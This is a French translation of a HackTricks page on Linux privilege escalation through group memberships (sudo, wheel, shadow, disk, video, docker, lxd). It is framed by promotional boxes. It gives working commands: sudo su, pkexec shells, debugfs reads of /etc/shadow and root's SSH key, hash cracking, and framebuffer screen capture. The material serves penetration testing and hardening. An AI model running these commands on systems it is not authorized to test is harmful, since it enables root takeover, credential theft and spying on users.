<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


# Groupes Sudo/Admin

## **PE - Méthode 1**

**Parfois**, **par défaut \(ou parce que certains logiciels en ont besoin\)** dans le fichier **/etc/sudoers** vous pouvez trouver certaines de ces lignes :
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Cela signifie que **tout utilisateur appartenant au groupe sudo ou admin peut exécuter n'importe quoi en tant que sudo**.

Si c'est le cas, pour **devenir root, vous pouvez simplement exécuter** :
```text
sudo su
```
## PE - Méthode 2

Trouvez tous les binaires suid et vérifiez s'il y a le binaire **Pkexec** :
```bash
find / -perm -4000 2>/dev/null
```
Si vous découvrez que le binaire pkexec est un binaire SUID et que vous appartenez au groupe sudo ou admin, vous pourriez probablement exécuter des binaires en tant que sudo en utilisant pkexec.
Vérifiez le contenu de :
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
```markdown
Vous y trouverez quels groupes sont autorisés à exécuter **pkexec** et **par défaut** dans certains linux peuvent **apparaître** certains des groupes **sudo ou admin**.

Pour **devenir root, vous pouvez exécuter** :
```
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Si vous essayez d'exécuter **pkexec** et que vous obtenez cette **erreur** :
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Ce n'est pas parce que vous n'avez pas les permissions, mais parce que vous n'êtes pas connecté sans interface graphique (GUI)**. Et il existe une solution à ce problème ici : [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Vous avez besoin de **2 sessions ssh différentes** :

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
```
{% endcode %}

{% code title="session2" %}
```
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

# Groupe Wheel

**Parfois**, **par défaut** dans le fichier **/etc/sudoers**, vous pouvez trouver cette ligne :
```text
%wheel	ALL=(ALL:ALL) ALL
```
Cela signifie que **tout utilisateur appartenant au groupe wheel peut exécuter n'importe quoi en tant que sudo**.

Si c'est le cas, pour **devenir root, vous pouvez simplement exécuter** :
```text
sudo su
```
# Groupe Shadow

Les utilisateurs du **groupe shadow** peuvent **lire** le fichier **/etc/shadow** :
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Alors, lisez le fichier et essayez de **craquer quelques hachages**.

# Groupe Disque

Ce privilège est presque **équivalent à un accès root** car vous pouvez accéder à toutes les données à l'intérieur de la machine.

Fichiers : `/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Notez qu'avec debugfs, vous pouvez également **écrire des fichiers**. Par exemple, pour copier `/tmp/asd1.txt` vers `/tmp/asd2.txt`, vous pouvez faire :
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Cependant, si vous essayez de **modifier des fichiers appartenant à root** \(comme `/etc/shadow` ou `/etc/passwd`\), vous aurez une erreur "**Permission refusée**".

# Groupe Vidéo

En utilisant la commande `w`, vous pouvez trouver **qui est connecté au système** et cela affichera une sortie comme la suivante :
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Le groupe **video** a accès pour voir le contenu affiché à l'écran. En gros, vous pouvez observer les écrans. Pour ce faire, vous devez **saisir l'image actuelle à l'écran** en données brutes et obtenir la résolution utilisée par l'écran. Les données de l'écran peuvent être sauvegardées dans `/dev/fb0` et vous pourriez trouver la résolution de cet écran dans `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Pour **ouvrir** l'**image brute**, vous pouvez utiliser **GIMP**, sélectionnez le fichier **`screen.raw`** et choisissez comme type de fichier **Données d'image brute** :

![](../../.gitbook/assets/image%20%28208%29.png)

Modifiez ensuite la Largeur et la Hauteur pour celles utilisées sur l'écran et vérifiez différents Types d'Image \(et sélectionnez celui qui affiche le mieux l'écran\) :

![](../../.gitbook/assets/image%20%28295%29.png)

# Groupe Root

Il semble que par défaut, les **membres du groupe root** pourraient avoir accès pour **modifier** certains fichiers de configuration de **services** ou certains fichiers de **bibliothèques** ou **d'autres choses intéressantes** qui pourraient être utilisées pour élever les privilèges...

**Vérifiez quels fichiers les membres root peuvent modifier** :
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Groupe Docker

Vous pouvez monter le système de fichiers racine de la machine hôte sur le volume d'une instance, de sorte que lorsque l'instance démarre, elle charge immédiatement un `chroot` dans ce volume. Cela vous donne effectivement les droits root sur la machine.

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

# Groupe lxc/lxd

[lxc - Élévation de privilèges](lxd-privilege-escalation.md)



<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
